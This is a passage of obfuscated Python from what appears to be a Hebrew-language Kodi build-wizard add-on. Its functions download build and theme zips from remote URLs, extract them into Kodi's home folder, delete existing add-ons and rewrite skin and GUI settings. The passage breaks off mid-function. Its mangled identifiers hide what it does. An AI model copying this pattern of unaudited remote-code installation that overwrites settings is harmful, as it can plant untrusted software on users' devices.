def fix18update ():#line:3856
	if KODIV >=18 :#line:3857
		xbmc .sleep (4000 )#line:3858
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3859
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3860
		fixfont ()#line:3861
		O0OO0O0OO000O00O0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3862
		try :#line:3863
			OO00OOO0OOO000OO0 =open (O0OO0O0OO000O00O0 ,'r')#line:3864
			OOO000O000OO00000 =OO00OOO0OOO000OO0 .read ()#line:3865
			OO00OOO0OOO000OO0 .close ()#line:3866
			OOOO0O0OO000O0O00 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3867
			OOOO0000O0OOO0O00 =re .compile (OOOO0O0OO000O0O00 ).findall (OOO000O000OO00000 )[0 ]#line:3868
			OO00OOO0OOO000OO0 =open (O0OO0O0OO000O00O0 ,'w')#line:3869
			OO00OOO0OOO000OO0 .write (OOO000O000OO00000 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OOOO0000O0OOO0O00 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3870
			OO00OOO0OOO000OO0 .close ()#line:3871
		except :#line:3872
				pass #line:3873
		wiz .kodi17Fix ()#line:3874
		O0OO0O0OO000O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3875
		try :#line:3876
			OO00OOO0OOO000OO0 =open (O0OO0O0OO000O00O0 ,'r')#line:3877
			OOO000O000OO00000 =OO00OOO0OOO000OO0 .read ()#line:3878
			OO00OOO0OOO000OO0 .close ()#line:3879
			OOOO0O0OO000O0O00 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3880
			OOOO0000O0OOO0O00 =re .compile (OOOO0O0OO000O0O00 ).findall (OOO000O000OO00000 )[0 ]#line:3881
			OO00OOO0OOO000OO0 =open (O0OO0O0OO000O00O0 ,'w')#line:3882
			OO00OOO0OOO000OO0 .write (OOO000O000OO00000 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OOOO0000O0OOO0O00 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3883
			OO00OOO0OOO000OO0 .close ()#line:3884
		except :#line:3885
				pass #line:3886
		swapSkins ('skin.Premium.mod')#line:3887
def buildWizard (OOO0O0000OO000O00 ,O0O0O0O000O0OOO00 ,theme =None ,over =False ):#line:3890
	if over ==False :#line:3891
		O0O000O00OO00O0O0 =wiz .checkBuild (OOO0O0000OO000O00 ,'url')#line:3892
		if O0O000O00OO00O0O0 ==False :#line:3894
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3899
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3900
			return #line:3901
		OOO00O0OOOOO0OO00 =wiz .workingURL (O0O000O00OO00O0O0 )#line:3902
		if OOO00O0OOOOO0OO00 ==False :#line:3903
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OOO00O0OOOOO0OO00 ))#line:3904
			return #line:3905
	if O0O0O0O000O0OOO00 =='gui':#line:3906
		if OOO0O0000OO000O00 ==BUILDNAME :#line:3907
			if over ==True :OOOOOOO00OO0O0OOO =1 #line:3908
			else :OOOOOOO00OO0O0OOO =1 #line:3909
		else :#line:3910
			OOOOOOO00OO0O0OOO =1 #line:3911
		if OOOOOOO00OO0O0OOO :#line:3912
			remove_addons ()#line:3913
			remove_addons2 ()#line:3914
			OO0O0OOOOO0OO0O00 =wiz .checkBuild (OOO0O0000OO000O00 ,'gui')#line:3915
			OOO0O0O0OO00OO00O =OOO0O0000OO000O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3916
			if not wiz .workingURL (OO0O0OOOOO0OO0O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3917
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3918
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0O0000OO000O00 ),'','אנא המתן')#line:3919
			OO0OOOOOO00O00000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO0O0O0OO00OO00O )#line:3920
			try :os .remove (OO0OOOOOO00O00000 )#line:3921
			except :pass #line:3922
			logging .warning (OO0O0OOOOO0OO0O00 )#line:3923
			if 'google'in OO0O0OOOOO0OO0O00 :#line:3924
			   O0O0O00O0O00O0O00 =googledrive_download (OO0O0OOOOO0OO0O00 ,OO0OOOOOO00O00000 ,DP ,wiz .checkBuild (OOO0O0000OO000O00 ,'filesize'))#line:3925
			else :#line:3928
			  downloader .download (OO0O0OOOOO0OO0O00 ,OO0OOOOOO00O00000 ,DP )#line:3929
			xbmc .sleep (100 )#line:3930
			O0OO0OOO0O0O0000O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0O0000OO000O00 )#line:3931
			DP .update (0 ,O0OO0OOO0O0O0000O ,'','אנא המתן')#line:3932
			extract .all (OO0OOOOOO00O00000 ,HOME ,DP ,title =O0OO0OOO0O0O0000O )#line:3933
			DP .close ()#line:3934
			wiz .defaultSkin ()#line:3935
			wiz .lookandFeelData ('save')#line:3936
			wiz .kodi17Fix ()#line:3937
			if KODIV >=18 :#line:3938
				skindialogsettind18 ()#line:3939
			xbmc .executebuiltin ("ReloadSkin()")#line:3940
			if INSTALLMETHOD ==1 :O0O0O00O00O0O0OO0 =1 #line:3941
			elif INSTALLMETHOD ==2 :O0O0O00O00O0O0OO0 =0 #line:3942
			else :DP .close ()#line:3943
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3944
			update_Votes ()#line:3945
			indicatorfastupdate ()#line:3946
		else :#line:3948
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3949
	if O0O0O0O000O0OOO00 =='gui2':#line:3950
		if OOO0O0000OO000O00 ==BUILDNAME :#line:3951
			if over ==True :OOOOOOO00OO0O0OOO =1 #line:3952
			else :OOOOOOO00OO0O0OOO =1 #line:3953
		else :#line:3954
			OOOOOOO00OO0O0OOO =1 #line:3955
		if OOOOOOO00OO0O0OOO :#line:3956
			remove_addons ()#line:3957
			remove_addons2 ()#line:3958
			OO0O0OOOOO0OO0O00 =wiz .checkBuild (OOO0O0000OO000O00 ,'gui')#line:3959
			OOO0O0O0OO00OO00O =OOO0O0000OO000O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3960
			if not wiz .workingURL (OO0O0OOOOO0OO0O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3961
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3962
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0O0000OO000O00 ),'','אנא המתן')#line:3963
			OO0OOOOOO00O00000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO0O0O0OO00OO00O )#line:3964
			try :os .remove (OO0OOOOOO00O00000 )#line:3965
			except :pass #line:3966
			logging .warning (OO0O0OOOOO0OO0O00 )#line:3967
			if 'google'in OO0O0OOOOO0OO0O00 :#line:3968
			   O0O0O00O0O00O0O00 =googledrive_download (OO0O0OOOOO0OO0O00 ,OO0OOOOOO00O00000 ,DP ,wiz .checkBuild (OOO0O0000OO000O00 ,'filesize'))#line:3969
			else :#line:3972
			  downloader .download (OO0O0OOOOO0OO0O00 ,OO0OOOOOO00O00000 ,DP )#line:3973
			xbmc .sleep (100 )#line:3974
			O0OO0OOO0O0O0000O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0O0000OO000O00 )#line:3975
			DP .update (0 ,O0OO0OOO0O0O0000O ,'','אנא המתן')#line:3976
			extract .all (OO0OOOOOO00O00000 ,HOME ,DP ,title =O0OO0OOO0O0O0000O )#line:3977
			DP .close ()#line:3978
			wiz .defaultSkin ()#line:3979
			wiz .lookandFeelData ('save')#line:3980
			if INSTALLMETHOD ==1 :O0O0O00O00O0O0OO0 =1 #line:3983
			elif INSTALLMETHOD ==2 :O0O0O00O00O0O0OO0 =0 #line:3984
			else :DP .close ()#line:3985
		else :#line:3987
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3988
	elif O0O0O0O000O0OOO00 =='fresh':#line:3989
		freshStart (OOO0O0000OO000O00 )#line:3990
	elif O0O0O0O000O0OOO00 =='normal':#line:3991
		if url =='normal':#line:3992
			if KEEPTRAKT =='true':#line:3993
				traktit .autoUpdate ('all')#line:3994
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3995
			if KEEPREAL =='true':#line:3996
				debridit .autoUpdate ('all')#line:3997
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3998
			if KEEPLOGIN =='true':#line:3999
				loginit .autoUpdate ('all')#line:4000
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4001
		O00OO0O00000OO0O0 =int (KODIV );O000O0000OOOOO00O =int (float (wiz .checkBuild (OOO0O0000OO000O00 ,'kodi')))#line:4002
		if not O00OO0O00000OO0O0 ==O000O0000OOOOO00O :#line:4003
			if O00OO0O00000OO0O0 ==16 and O000O0000OOOOO00O <=15 :OOOOOOOOO0OO0OOOO =False #line:4004
			else :OOOOOOOOO0OO0OOOO =True #line:4005
		else :OOOOOOOOO0OO0OOOO =False #line:4006
		if OOOOOOOOO0OO0OOOO ==True :#line:4007
			O0O0OO0OOO0OO00O0 =1 #line:4008
		else :#line:4009
			if not over ==False :O0O0OO0OOO0OO00O0 =1 #line:4010
			else :O0O0OO0OOO0OO00O0 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4011
		if O0O0OO0OOO0OO00O0 :#line:4012
			wiz .clearS ('build')#line:4013
			OO0O0OOOOO0OO0O00 =wiz .checkBuild (OOO0O0000OO000O00 ,'url')#line:4014
			OOO0O0O0OO00OO00O =OOO0O0000OO000O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4015
			if not wiz .workingURL (OO0O0OOOOO0OO0O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4016
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4017
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0O0000OO000O00 ,wiz .checkBuild (OOO0O0000OO000O00 ,'version')),'','אנא המתן')#line:4018
			OO0OOOOOO00O00000 =os .path .join (PACKAGES ,'%s.zip'%OOO0O0O0OO00OO00O )#line:4019
			try :os .remove (OO0OOOOOO00O00000 )#line:4020
			except :pass #line:4021
			logging .warning (OO0O0OOOOO0OO0O00 )#line:4022
			if 'google'in OO0O0OOOOO0OO0O00 :#line:4023
			   O0O0O00O0O00O0O00 =googledrive_download (OO0O0OOOOO0OO0O00 ,OO0OOOOOO00O00000 ,DP ,wiz .checkBuild (OOO0O0000OO000O00 ,'filesize'))#line:4024
			else :#line:4027
			  downloader .download (OO0O0OOOOO0OO0O00 ,OO0OOOOOO00O00000 ,DP )#line:4028
			xbmc .sleep (1000 )#line:4029
			O0OO0OOO0O0O0000O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0O0000OO000O00 ,wiz .checkBuild (OOO0O0000OO000O00 ,'version'))#line:4030
			DP .update (0 ,O0OO0OOO0O0O0000O ,'','Please Wait')#line:4031
			OO000000000O00000 ,OO00O00O0O00O0O0O ,OOOOO00O0OO000O00 =extract .all (OO0OOOOOO00O00000 ,HOME ,DP ,title =O0OO0OOO0O0O0000O )#line:4032
			if int (float (OO000000000O00000 ))>0 :#line:4033
				try :#line:4034
					wiz .fixmetas ()#line:4035
				except :pass #line:4036
				wiz .lookandFeelData ('save')#line:4037
				wiz .defaultSkin ()#line:4038
				wiz .setS ('buildname',OOO0O0000OO000O00 )#line:4040
				wiz .setS ('buildversion',wiz .checkBuild (OOO0O0000OO000O00 ,'version'))#line:4041
				wiz .setS ('buildtheme','')#line:4042
				wiz .setS ('latestversion',wiz .checkBuild (OOO0O0000OO000O00 ,'version'))#line:4043
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4044
				wiz .setS ('installed','true')#line:4045
				wiz .setS ('extract',str (OO000000000O00000 ))#line:4046
				wiz .setS ('errors',str (OO00O00O0O00O0O0O ))#line:4047
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO000000000O00000 ,OO00O00O0O00O0O0O ))#line:4048
				fastupdatefirstbuild (NOTEID )#line:4049
				wiz .kodi17Fix ()#line:4050
				skin_homeselect ()#line:4051
				skin_lower ()#line:4052
				rdbuildinstall ()#line:4053
				try :gaiaserenaddon ()#line:4054
				except :pass #line:4055
				adults18 ()#line:4056
				skinfix18 ()#line:4057
				try :os .remove (OO0OOOOOO00O00000 )#line:4059
				except :pass #line:4060
				O0O0O00OO00000OOO =(ADDON .getSetting ("auto_rd"))#line:4061
				if O0O0O00OO00000OOO =='true':#line:4062
					try :#line:4063
						setautorealdebrid ()#line:4064
					except :pass #line:4065
				try :#line:4066
					autotrakt ()#line:4067
				except :pass #line:4068
				OOOO0O0OOOO000000 =(ADDON .getSetting ("imdb_on"))#line:4069
				if OOOO0O0OOOO000000 =='true':#line:4070
					imdb_synck ()#line:4071
				iptvset ()#line:4072
				if int (float (OO00O00O0O00O0O0O ))>0 :#line:4074
					OOOOOOO00OO0O0OOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0O0000OO000O00 ,wiz .checkBuild (OOO0O0000OO000O00 ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OO000000000O00000 ,'%',COLOR1 ,OO00O00O0O00O0O0O ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4075
					if OOOOOOO00OO0O0OOO :#line:4076
						if isinstance (OO00O00O0O00O0O0O ,unicode ):#line:4077
							OOOOO00O0OO000O00 =OOOOO00O0OO000O00 .encode ('utf-8')#line:4078
						wiz .TextBox (ADDONTITLE ,OOOOO00O0OO000O00 )#line:4079
				DP .close ()#line:4080
				O0000OOO0O0000OO0 =wiz .themeCount (OOO0O0000OO000O00 )#line:4081
				builde_Votes ()#line:4082
				indicator ()#line:4083
				if not O0000OOO0O0000OO0 ==False :#line:4084
					buildWizard (OOO0O0000OO000O00 ,'theme')#line:4085
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4086
				if INSTALLMETHOD ==1 :O0O0O00O00O0O0OO0 =1 #line:4087
				elif INSTALLMETHOD ==2 :O0O0O00O00O0O0OO0 =0 #line:4088
				else :resetkodi ()#line:4089
				if O0O0O00O00O0O0OO0 ==1 :wiz .reloadFix ()#line:4091
				else :wiz .killxbmc (True )#line:4092
			else :#line:4093
				if isinstance (OO00O00O0O00O0O0O ,unicode ):#line:4094
					OOOOO00O0OO000O00 =OOOOO00O0OO000O00 .encode ('utf-8')#line:4095
				OOOO0000O0000O0OO =open (OO0OOOOOO00O00000 ,'r')#line:4096
				OOO0O0OOOOO0O0000 =OOOO0000O0000O0OO .read ()#line:4097
				O0OO0O0OOO00OO00O =''#line:4098
				for OO0O00OOO000000OO in O0O0O00O0O00O0O00 :#line:4099
				  O0OO0O0OOO00OO00O ='key: '+O0OO0O0OOO00OO00O +'\n'+OO0O00OOO000000OO #line:4100
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OOOOO00O0OO000O00 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+O0OO0O0OOO00OO00O )#line:4101
		else :#line:4102
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4103
	elif O0O0O0O000O0OOO00 =='theme':#line:4104
		if theme ==None :#line:4105
			O0000OOO0O0000OO0 =wiz .checkBuild (OOO0O0000OO000O00 ,'theme')#line:4106
			OOO0O0OOOO00O0OO0 =[]#line:4107
			if not O0000OOO0O0000OO0 =='http://'and wiz .workingURL (O0000OOO0O0000OO0 )==True :#line:4108
				OOO0O0OOOO00O0OO0 =wiz .themeCount (OOO0O0000OO000O00 ,False )#line:4109
				if len (OOO0O0OOOO00O0OO0 )>0 :#line:4110
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OOO0O0000OO000O00 ,COLOR1 ,len (OOO0O0OOOO00O0OO0 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4111
						wiz .log ("Theme List: %s "%str (OOO0O0OOOO00O0OO0 ))#line:4112
						O00O0O0O00OOO0O0O =DIALOG .select (ADDONTITLE ,OOO0O0OOOO00O0OO0 )#line:4113
						wiz .log ("Theme install selected: %s"%O00O0O0O00OOO0O0O )#line:4114
						if not O00O0O0O00OOO0O0O ==-1 :theme =OOO0O0OOOO00O0OO0 [O00O0O0O00OOO0O0O ];O0000OO000000O00O =True #line:4115
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4116
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4117
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4118
		else :O0000OO000000O00O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OOO0O0000OO000O00 ,wiz .checkBuild (OOO0O0000OO000O00 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4119
		if O0000OO000000O00O :#line:4120
			OOO0OOOOO000000OO =wiz .checkTheme (OOO0O0000OO000O00 ,theme ,'url')#line:4121
			OOO0O0O0OO00OO00O =OOO0O0000OO000O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4122
			if not wiz .workingURL (OOO0OOOOO000000OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4123
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4124
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4125
			OO0OOOOOO00O00000 =os .path .join (PACKAGES ,'%s.zip'%OOO0O0O0OO00OO00O )#line:4126
			try :os .remove (OO0OOOOOO00O00000 )#line:4127
			except :pass #line:4128
			downloader .download (OOO0OOOOO000000OO ,OO0OOOOOO00O00000 ,DP )#line:4129
			xbmc .sleep (1000 )#line:4130
			DP .update (0 ,"","Installing %s "%OOO0O0000OO000O00 )#line:4131
			OO0OO00OOO00OOOO0 =False #line:4132
			if url not in ["fresh","normal"]:#line:4133
				OO0OO00OOO00OOOO0 =testTheme (OO0OOOOOO00O00000 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4134
				OOO0O0O00O0OOO000 =testGui (OO0OOOOOO00O00000 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4135
				if OO0OO00OOO00OOOO0 ==True :#line:4136
					wiz .lookandFeelData ('save')#line:4137
					O0O0O000OO0OOOO00 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4138
					O000O00OO00O00000 =xbmc .getSkinDir ()#line:4139
					skinSwitch .swapSkins (O0O0O000OO0OOOO00 )#line:4141
					O0O0O0OOOOO00OOOO =0 #line:4142
					xbmc .sleep (1000 )#line:4143
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0O0OOOOO00OOOO <150 :#line:4144
						O0O0O0OOOOO00OOOO +=1 #line:4145
						xbmc .sleep (1000 )#line:4146
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4147
						wiz .ebi ('SendClick(11)')#line:4148
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4149
					xbmc .sleep (1000 )#line:4150
			O0OO0OOO0O0O0000O ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4151
			DP .update (0 ,O0OO0OOO0O0O0000O ,'','אנא המתן')#line:4152
			OO000000000O00000 ,OO00O00O0O00O0O0O ,OOOOO00O0OO000O00 =extract .all (OO0OOOOOO00O00000 ,HOME ,DP ,title =O0OO0OOO0O0O0000O )#line:4153
			wiz .setS ('buildtheme',theme )#line:4154
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OO000000000O00000 ,OO00O00O0O00O0O0O ))#line:4155
			DP .close ()#line:4156
			if url not in ["fresh","normal"]:#line:4157
				wiz .forceUpdate ()#line:4158
				if KODIV >=17 :wiz .kodi17Fix ()#line:4159
				if OOO0O0O00O0OOO000 ==True :#line:4160
					wiz .lookandFeelData ('save')#line:4161
					wiz .defaultSkin ()#line:4162
					O000O00OO00O00000 =wiz .getS ('defaultskin')#line:4163
					skinSwitch .swapSkins (O000O00OO00O00000 )#line:4164
					O0O0O0OOOOO00OOOO =0 #line:4165
					xbmc .sleep (1000 )#line:4166
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0O0OOOOO00OOOO <150 :#line:4167
						O0O0O0OOOOO00OOOO +=1 #line:4168
						xbmc .sleep (1000 )#line:4169
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4171
						wiz .ebi ('SendClick(11)')#line:4172
					wiz .lookandFeelData ('restore')#line:4173
				elif OO0OO00OOO00OOOO0 ==True :#line:4174
					skinSwitch .swapSkins (O000O00OO00O00000 )#line:4175
					O0O0O0OOOOO00OOOO =0 #line:4176
					xbmc .sleep (1000 )#line:4177
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0O0OOOOO00OOOO <150 :#line:4178
						O0O0O0OOOOO00OOOO +=1 #line:4179
						xbmc .sleep (1000 )#line:4180
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4182
						wiz .ebi ('SendClick(11)')#line:4183
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4184
					wiz .lookandFeelData ('restore')#line:4185
				else :#line:4186
					wiz .ebi ("ReloadSkin()")#line:4187
					xbmc .sleep (1000 )#line:4188
					wiz .ebi ("Container.Refresh")#line:4189
		else :#line:4190
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4191
def skin_homeselect ():#line:4195
	try :#line:4197
		OO0O0000O00OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4198
		OO00000OO0000O000 =open (OO0O0000O00OOOO0O ,'r')#line:4200
		O0O0O0OO0O0OO00OO =OO00000OO0000O000 .read ()#line:4201
		OO00000OO0000O000 .close ()#line:4202
		O0OOOOOO000O0000O ='<setting id="HomeS" type="string(.+?)/setting>'#line:4203
		O0O0O0OOOOO000O00 =re .compile (O0OOOOOO000O0000O ).findall (O0O0O0OO0O0OO00OO )[0 ]#line:4204
		OO00000OO0000O000 =open (OO0O0000O00OOOO0O ,'w')#line:4205
		OO00000OO0000O000 .write (O0O0O0OO0O0OO00OO .replace ('<setting id="HomeS" type="string%s/setting>'%O0O0O0OOOOO000O00 ,'<setting id="HomeS" type="string"></setting>'))#line:4206
		OO00000OO0000O000 .close ()#line:4207
	except :#line:4208
		pass #line:4209
def skin_lower ():#line:4212
	OOOOOO000O0000O00 =(ADDON .getSetting ("lower"))#line:4213
	if OOOOOO000O0000O00 =='true':#line:4214
		try :#line:4217
			O0OOO000OO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4218
			OO00000O00O0000OO =open (O0OOO000OO0OO0O0O ,'r')#line:4220
			OO0000O0O0OO00O00 =OO00000O00O0000OO .read ()#line:4221
			OO00000O00O0000OO .close ()#line:4222
			O000OOO00O000OO00 ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4223
			OO000O000OOOOOOO0 =re .compile (O000OOO00O000OO00 ).findall (OO0000O0O0OO00O00 )[0 ]#line:4224
			OO00000O00O0000OO =open (O0OOO000OO0OO0O0O ,'w')#line:4225
			OO00000O00O0000OO .write (OO0000O0O0OO00O00 .replace ('<setting id="none_widget" type="bool%s/setting>'%OO000O000OOOOOOO0 ,'<setting id="none_widget" type="bool">true</setting>'))#line:4226
			OO00000O00O0000OO .close ()#line:4227
			O0OOO000OO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4229
			OO00000O00O0000OO =open (O0OOO000OO0OO0O0O ,'r')#line:4231
			OO0000O0O0OO00O00 =OO00000O00O0000OO .read ()#line:4232
			OO00000O00O0000OO .close ()#line:4233
			O000OOO00O000OO00 ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4234
			OO000O000OOOOOOO0 =re .compile (O000OOO00O000OO00 ).findall (OO0000O0O0OO00O00 )[0 ]#line:4235
			OO00000O00O0000OO =open (O0OOO000OO0OO0O0O ,'w')#line:4236
			OO00000O00O0000OO .write (OO0000O0O0OO00O00 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OO000O000OOOOOOO0 ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4237
			OO00000O00O0000OO .close ()#line:4238
			O0OOO000OO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4240
			OO00000O00O0000OO =open (O0OOO000OO0OO0O0O ,'r')#line:4242
			OO0000O0O0OO00O00 =OO00000O00O0000OO .read ()#line:4243
			OO00000O00O0000OO .close ()#line:4244
			O000OOO00O000OO00 ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4245
			OO000O000OOOOOOO0 =re .compile (O000OOO00O000OO00 ).findall (OO0000O0O0OO00O00 )[0 ]#line:4246
			OO00000O00O0000OO =open (O0OOO000OO0OO0O0O ,'w')#line:4247
